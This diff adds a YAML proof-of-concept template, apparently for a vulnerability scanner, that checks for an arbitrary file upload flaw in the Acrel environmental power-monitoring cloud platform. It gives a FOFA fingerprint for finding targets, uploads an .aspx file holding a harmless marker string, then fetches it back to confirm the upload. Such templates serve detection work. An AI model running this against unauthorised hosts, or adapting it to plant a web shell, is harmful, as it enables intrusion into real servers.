@@ -1,0 +1,32 @@
+id: poc-yaml-acreldny-uploadnewsimg-anyfile-upload
+info:
+  name: 安科瑞环保用电监管云平台 UploadNewsImg 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 安科瑞环保用电监管云平台
+  fofa: body="myCss/phone.css"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /NewsManage/UploadNewsImg
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRDazwgc1RnTaskmR
+  data: '------WebKitFormBoundaryRDazwgc1RnTaskmR
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryRDazwgc1RnTaskmR--'
+  expression: status_code == 200 && contains(body,"\"imgurl\":") && contains(body,".aspx")
+    && !contains(body,"<")
+  output:
+  - regex_match(body,"/UpLoad/News/(?P<file>.*?).aspx")
+- method: GET
+  path: /UpLoad/News/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
